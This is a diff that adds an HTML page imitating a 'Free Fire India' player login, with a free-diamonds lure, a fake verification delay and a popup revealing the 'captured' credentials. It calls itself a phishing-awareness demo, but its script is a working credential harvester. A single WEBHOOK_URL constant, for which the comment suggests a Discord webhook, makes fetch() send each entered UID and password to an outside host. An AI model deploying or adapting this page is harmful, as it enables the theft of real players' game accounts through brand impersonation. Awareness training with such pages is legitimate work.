@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Fire India — Player Login</title>
+<link href="https://fonts.googleapis.com/css2?family=Russo+One&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0b0e17;
+    --panel:#131828;
+    --panel-2:#1a2138;
+    --line:#2a3352;
+    --orange:#ff6a00;
+    --orange-2:#ff9432;
+    --text:#e8ecf6;
+    --muted:#8b95b5;
+    --green:#35d07f;
+    --red:#ff4d5e;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    font-family:'Rajdhani',sans-serif;
+    background:var(--bg);
+    color:var(--text);
+    display:flex;align-items:center;justify-content:center;
+    min-height:100vh;
+    padding:20px;
+    position:relative;
+    overflow-x:hidden;
+  }
+  /* background texture: faint diagonal tech lines */
+  body::before{
+    content:"";
+    position:fixed;inset:0;
+    background:
+      repeating-linear-gradient(-45deg, transparent 0 22px, rgba(255,106,0,.035) 22px 23px),
+      radial-gradient(ellipse 70% 60% at 50% 35%, rgba(255,106,0,.08), transparent 70%);
+    pointer-events:none;
+  }
+  /* floating diamonds */
+  .diamond{
+    position:fixed;
+    width:18px;height:18px;
+    background:rgba(255,106,0,.12);
+    transform:rotate(45deg);
+    animation:float 14s linear infinite;
+    pointer-events:none;
+  }
+  .diamond:nth-child(1){left:8%;top:70%;animation-duration:18s}
+  .diamond:nth-child(2){left:88%;top:20%;width:12px;height:12px;animation-duration:22s;animation-delay:-6s}
+  .diamond:nth-child(3){left:75%;top:80%;width:26px;height:26px;animation-duration:26s;animation-delay:-12s}
+  .diamond:nth-child(4){left:18%;top:12%;width:10px;height:10px;animation-duration:16s;animation-delay:-3s}
+  @keyframes float{
+    0%{transform:rotate(45deg) translateY(0);opacity:0}
+    10%{opacity:1}
+    90%{opacity:1}
+    100%{transform:rotate(405deg) translateY(-120vh);opacity:0}
+  }
+
+  .login-card{
+    position:relative;
+    width:100%;max-width:420px;
+    background:var(--panel);
+    border:1px solid var(--line);
+    clip-path:polygon(0 0, calc(100% - 26px) 0, 100% 26px, 100% 100%, 26px 100%, 0 calc(100% - 26px));
+    padding:38px 34px 30px;
+    transition:transform .15s ease-out;
+    will-change:transform;
+    z-index:1;
+  }
+  .login-card::after{
+    content:"";
+    position:absolute;top:0;left:0;right:0;height:4px;
+    background:var(--orange);
+  }
+  .brand{display:flex;align-items:center;gap:12px;margin-bottom:6px}
+  .brand svg{flex:none}
+  .brand-name{
+    font-family:'Russo One',sans-serif;
+    font-size:26px;letter-spacing:1px;line-height:1;
+  }
+  .brand-name em{font-style:normal;color:var(--orange)}
+  .brand-region{
+    font-size:12px;font-weight:700;letter-spacing:4px;
+    color:var(--muted);text-transform:uppercase;margin-bottom:22px;
+  }
+  .event-strip{
+    display:flex;align-items:center;gap:10px;
+    background:rgba(53,208,127,.08);
+    border:1px solid rgba(53,208,127,.35);
+    padding:9px 12px;margin-bottom:22px;
+    font-size:14px;font-weight:600;color:var(--green);
+  }
+  .event-strip svg{flex:none}
+  .event-strip b{color:#fff}
+  .event-strip .pulse{
+    width:8px;height:8px;border-radius:50%;
+    background:var(--green);
+    animation:pulse 1.4s infinite;
+    flex:none;margin-left:auto;
+  }
+  @keyframes pulse{
+    0%,100%{box-shadow:0 0 0 0 rgba(53,208,127,.5)}
+    60%{box-shadow:0 0 0 7px rgba(53,208,127,0)}
+  }
+  h1{
+    font-family:'Russo One',sans-serif;
+    font-size:18px;letter-spacing:2px;
+    text-transform:uppercase;margin-bottom:4px;
+  }
+  .sub{color:var(--muted);font-size:14px;margin-bottom:24px;font-weight:500}
+
+  .field{margin-bottom:16px}
+  label{
+    display:block;font-size:12px;font-weight:700;
+    letter-spacing:2px;text-transform:uppercase;
+    color:var(--muted);margin-bottom:7px;
+  }
+  .input-wrap{position:relative}
+  .input-wrap .lead-ico{
+    position:absolute;left:12px;top:50%;transform:translateY(-50%);
+    color:var(--muted);pointer-events:none;
+  }
+  input[type=text],input[type=password],select{
+    width:100%;
+    background:var(--panel-2);
+    border:1px solid var(--line);
+    color:var(--text);
+    font-family:'Rajdhani',sans-serif;
+    font-size:16px;font-weight:600;
+    padding:12px 42px 12px 40px;
+    outline:none;
+    transition:border-color .15s;
+  }
+  input:focus,select:focus{border-color:var(--orange)}
+  input::placeholder{color:#525d80;font-weight:500}
+  select{appearance:none;cursor:pointer;padding-left:12px}
+  .select-wrap::after{
+    content:"";position:absolute;right:14px;top:50%;
+    width:8px;height:8px;border-right:2px solid var(--muted);border-bottom:2px solid var(--muted);
+    transform:translateY(-70%) rotate(45deg);pointer-events:none;
+  }
+  .toggle-eye{
+    position:absolute;right:6px;top:50%;transform:translateY(-50%);
+    background:none;border:none;color:var(--muted);cursor:pointer;
+    padding:6px;display:flex;
+  }
+  .toggle-eye:hover{color:var(--text)}
+
+  .row{
+    display:flex;justify-content:space-between;align-items:center;
+    margin:6px 0 20px;font-size:14px;color:var(--muted);font-weight:600;
+  }
+  .check{display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none}
+  .check input{display:none}
+  .box{
+    width:16px;height:16px;border:1px solid var(--line);
+    background:var(--panel-2);display:inline-block;position:relative;flex:none;
+  }
+  .check input:checked + .box{border-color:var(--orange);background:var(--orange)}
+  .check input:checked + .box::after{
+    content:"";position:absolute;left:4px;top:1px;
+    width:5px;height:9px;border-right:2px solid #0b0e17;border-bottom:2px solid #0b0e17;
+    transform:rotate(40deg);
+  }
+  a{color:var(--orange-2);text-decoration:none;font-weight:700}
+  a:hover{text-decoration:underline}
+
+  .btn-login{
+    width:100%;
+    font-family:'Russo One',sans-serif;
+    font-size:16px;letter-spacing:3px;
+    background:var(--orange);color:#0b0e17;
+    border:none;padding:15px 0;cursor:pointer;
+    text-transform:uppercase;position:relative;overflow:hidden;
+    clip-path:polygon(0 0, calc(100% - 14px) 0, 100% 14px, 100% 100%, 14px 100%, 0 calc(100% - 14px));
+    transition:background .15s;
+  }
+  .btn-login:hover{background:var(--orange-2)}
+  .btn-login:disabled{opacity:.6;cursor:wait}
+  .spinner{
+    width:16px;height:16px;border:2px solid rgba(11,14,23,.3);
+    border-top-color:#0b0e17;border-radius:50%;
+    animation:spin .7s linear infinite;display:inline-block;vertical-align:-3px;margin-right:8px;
+    display:none;
+  }
+  .btn-login.loading .spinner{display:inline-block}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  .err{
+    display:none;align-items:center;gap:8px;
+    background:rgba(255,77,94,.09);border:1px solid rgba(255,77,94,.4);
+    color:var(--red);font-weight:700;font-size:13px;
+    padding:9px 12px;margin-bottom:16px;
+  }
+  .err.show{display:flex}
+
+  .hint{
+    margin-top:18px;text-align:center;
+    font-size:12.5px;color:var(--muted);font-weight:500;line-height:1.5;
+  }
+  .hint span{color:var(--orange-2);font-weight:700}
+
+  /* modal */
+  .overlay{
+    position:fixed;inset:0;background:rgba(5,7,13,.8);
+    display:flex;align-items:center;justify-content:center;
+    opacity:0;pointer-events:none;transition:opacity .2s;z-index:10;padding:20px;
+  }
+  .overlay.open{opacity:1;pointer-events:auto}
+  .modal{
+    width:100%;max-width:400px;background:var(--panel);
+    border:1px solid var(--line);
+    clip-path:polygon(0 0, calc(100% - 22px) 0, 100% 22px, 100% 100%, 22px 100%, 0 calc(100% - 22px));
+    transform:translateY(14px);transition:transform .25s;
+  }
+  .overlay.open .modal{transform:translateY(0)}
+  .modal-head{
+    background:var(--orange);color:#0b0e17;
+    font-family:'Russo One',sans-serif;font-size:14px;letter-spacing:2px;
+    padding:13px 20px;display:flex;align-items:center;gap:10px;
+  }
+  .modal-body{padding:22px 22px 24px}
+  .cap-row{
+    display:flex;justify-content:space-between;align-items:flex-start;gap:14px;
+    padding:11px 0;border-bottom:1px dashed var(--line);
+  }
+  .cap-row:last-of-type{border-bottom:none}
+  .cap-row dt{font-size:11px;letter-spacing:2px;color:var(--muted);font-weight:700;text-transform:uppercase;padding-top:2px}
+  .cap-row dd{font-size:15px;font-weight:700;word-break:break-all;text-align:right}
+  .modal-note{
+    margin-top:14px;font-size:12.5px;color:var(--muted);line-height:1.5;font-weight:500;
+  }
+  .modal-actions{display:flex;gap:10px;margin-top:18px}
+  .modal-actions button{
+    flex:1;font-family:'Russo One',sans-serif;font-size:12px;letter-spacing:2px;
+    padding:11px 0;cursor:pointer;border:none;text-transform:uppercase;
+    clip-path:polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px));
+  }
+  .btn-ghost{background:var(--panel-2);color:var(--text);border:1px solid var(--line)}
+  .btn-ghost:hover{border-color:var(--muted)}
+  .btn-solid{background:var(--orange);color:#0b0e17}
+  .btn-solid:hover{background:var(--orange-2)}
+
+  .toast{
+    position:fixed;bottom:24px;left:50%;
+    transform:translate(-50%,80px);
+    background:var(--panel);border:1px solid var(--green);
+    color:var(--green);font-weight:700;font-size:14px;
+    padding:11px 20px;display:flex;align-items:center;gap:9px;
+    transition:transform .3s;z-index:20;
+    clip-path:polygon(0 0, calc(100% - 12px) 0, 100% 12px, 100% 100%, 12px 100%, 0 calc(100% - 12px));
+  }
+  .toast.show{transform:translate(-50%,0)}
+
+  @media(max-width:440px){
+    .login-card{padding:32px 22px 24px}
+  }
+</style>
+</head>
+<body>
+
+<div class="diamond"></div><div class="diamond"></div><div class="diamond"></div><div class="diamond"></div>
+
+<main class="login-card" id="card">
+  <div class="brand">
+    <svg width="34" height="34" viewBox="0 0 34 34" fill="none">
+      <path d="M17 2 L30 12 L25 30 L9 30 L4 12 Z" stroke="#ff6a00" stroke-width="2.5" fill="rgba(255,106,0,.12)"/>
+      <path d="M17 10 L21.5 16 L17 24 L12.5 16 Z" fill="#ff6a00"/>
+    </svg>
+    <span class="brand-name">FREE<em>FIRE</em></span>
+  </div>
+  <div class="brand-region">India Server &mdash; Player Login</div>
+
+  <div class="event-strip">
+    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M6 3h12l4 6-10 12L2 9z"/><path d="M2 9h20M9 3l3 6 3-3M12 9l-3 12M12 9l3 12"/>
+    </svg>
+    <span>LIMITED EVENT &mdash; Login now to claim <b>&nbsp;500 Diamonds</b></span>
+    <span class="pulse"></span>
+  </div>
+
+  <h1>Player Login</h1>
+  <p class="sub">Enter your details to continue to the India server</p>
+
+  <div class="err" id="err">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round">
+      <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+    </svg>
+    <span id="errText"></span>
+  </div>
+
+  <form id="loginForm" novalidate>
+    <div class="field">
+      <label for="uid">Player UID / Email / Mobile</label>
+      <div class="input-wrap">
+        <span class="lead-ico">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
+          </svg>
+        </span>
+        <input type="text" id="uid" placeholder="Enter your Player UID or email" autocomplete="off">
+      </div>
+    </div>
+
+    <div class="field">
+      <label for="pass">Password</label>
+      <div class="input-wrap">
+        <span class="lead-ico">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          </svg>
+        </span>
+        <input type="password" id="pass" placeholder="Enter your password" autocomplete="off">
+        <button type="button" class="toggle-eye" id="eyeBtn" aria-label="Show password">
+          <svg id="eyeOpen" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+          </svg>
+          <svg id="eyeClosed" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <div class="field select-wrap input-wrap">
+      <label for="server">Select Server</label>
+      <select id="server">
+        <option>India (Mumbai)</option>
+        <option>India (Delhi)</option>
+        <option>India (Chennai)</option>
+      </select>
+    </div>
+
+    <div class="row">
+      <label class="check"><input type="checkbox" id="remember" checked><span class="box"></span>Remember me</label>
+      <a href="#" onclick="return false">Forgot password?</a>
+    </div>
+
+    <button type="submit" class="btn-login" id="btn">
+      <span class="spinner"></span>Login
+    </button>
+  </form>
+
+  <p class="hint">New player? <span>Create an account</span> &mdash; demo page for <b>phishing-awareness training</b>.</p>
+</main>
+
+<!-- captured credentials modal -->
+<div class="overlay" id="overlay">
+  <div class="modal">
+    <div class="modal-head">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+      </svg>
+      CREDENTIALS CAPTURED
+    </div>
+    <div class="modal-body">
+      <dl>
+        <div class="cap-row"><dt>Login</dt><dd id="capUid">—</dd></div>
+        <div class="cap-row"><dt>Password</dt><dd id="capPass">—</dd></div>
+        <div class="cap-row"><dt>Server</dt><dd id="capServer">—</dd></div>
+        <div class="cap-row"><dt>Time</dt><dd id="capTime">—</dd></div>
+        <div class="cap-row"><dt>Sent to webhook</dt><dd id="capHook">—</dd></div>
+      </dl>
+      <p class="modal-note">This is exactly what a real phishing page does invisibly — the victim never sees this. In a live attack the data is silently sent to the attacker.</p>
+      <div class="modal-actions">
+        <button class="btn-ghost" id="btnAgain">Try again</button>
+        <button class="btn-solid" id="btnClose">Got it</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast">
+  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+    <polyline points="20 6 9 17 4 12"/>
+  </svg>
+  <span id="toastText">Done</span>
+</div>
+
+<script>
+  /* ============================================================
+     OPTIONAL: paste a webhook URL here (e.g. a Discord webhook,
+     Google Apps Script URL, or https://httpbin.org/post for testing).
+     If left empty, credentials are only shown in the popup.
+     Example: const WEBHOOK_URL = "https://discord.com/api/webhooks/...";
+  ============================================================ */
+  const WEBHOOK_URL = "";
+
+  const form = document.getElementById('loginForm');
+  const uid = document.getElementById('uid');
+  const pass = document.getElementById('pass');
+  const server = document.getElementById('server');
+  const btn = document.getElementById('btn');
+  const err = document.getElementById('err');
+  const errText = document.getElementById('errText');
+  const overlay = document.getElementById('overlay');
+  const toast = document.getElementById('toast');
+
+  // show / hide password
+  document.getElementById('eyeBtn').addEventListener('click', () => {
+    const show = pass.type === 'password';
+    pass.type = show ? 'text' : 'password';
+    document.getElementById('eyeOpen').style.display = show ? 'block' : 'none';
+    document.getElementById('eyeClosed').style.display = show ? 'none' : 'block';
+    pass.focus();
+  });
+
+  // error helpers
+  function showError(msg){ errText.textContent = msg; err.classList.add('show'); }
+  function hideError(){ err.classList.remove('show'); }
+  uid.addEventListener('input', hideError);
+  pass.addEventListener('input', hideError);
+
+  // toast
+  let toastTimer;
+  function showToast(msg){
+    document.getElementById('toastText').textContent = msg;
+    toast.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => toast.classList.remove('show'), 2600);
+  }
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const u = uid.value.trim(), p = pass.value.trim();
+    if(!u){ showError('Please enter your Player UID, email or mobile number.'); uid.focus(); return; }
+    if(!p){ showError('Please enter your password.'); pass.focus(); return; }
+
+    // simulate server verification delay (real pages do this to feel authentic)
+    btn.disabled = true;
+    btn.classList.add('loading');
+
+    let hookResult = 'No (WEBHOOK_URL empty)';
+    if(WEBHOOK_URL){
+      try{
+        await fetch(WEBHOOK_URL, {
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ uid:u, password:p, server:server.value, time:new Date().toLocaleString() })
+        });
+        hookResult = 'Yes';
+      }catch(_){ hookResult = 'Failed'; }
+    }
+
+    setTimeout(() => {
+      btn.disabled = false;
+      btn.classList.remove('loading');
+
+      // display captured credentials (this is the "awareness lesson" popup)
+      document.getElementById('capUid').textContent = u;
+      document.getElementById('capPass').textContent = p;
+      document.getElementById('capServer').textContent = server.value;
+      document.getElementById('capTime').textContent = new Date().toLocaleString();
+      document.getElementById('capHook').textContent = hookResult;
+      overlay.classList.add('open');
+    }, 1200);
+  });
+
+  document.getElementById('btnClose').addEventListener('click', () => {
+    overlay.classList.remove('open');
+    showToast('Credentials captured — page kept as demo.');
+  });
+  document.getElementById('btnAgain').addEventListener('click', () => {
+    overlay.classList.remove('open');
+    form.reset();
+    document.getElementById('remember').checked = true;
+    uid.focus();
+  });
+  overlay.addEventListener('click', (e) => { if(e.target === overlay) overlay.classList.remove('open'); });
+
+  // subtle 3D tilt on the login card (desktop only)
+  const card = document.getElementById('card');
+  if(matchMedia('(hover:hover)').matches){
+    document.addEventListener('mousemove', (e) => {
+      const r = card.getBoundingClientRect();
+      const cx = r.left + r.width/2, cy = r.top + r.height/2;
+      const dx = (e.clientX - cx) / r.width;
+      const dy = (e.clientY - cy) / r.height;
+      const dist = Math.hypot(dx, dy);
+      if(dist < 1.3){
+        card.style.transform = `perspective(900px) rotateY(${dx*4}deg) rotateX(${-dy*4}deg)`;
+      }else{
+        card.style.transform = 'perspective(900px)';
+      }
+    });
+  }
+</script>
+</body>
+</html>
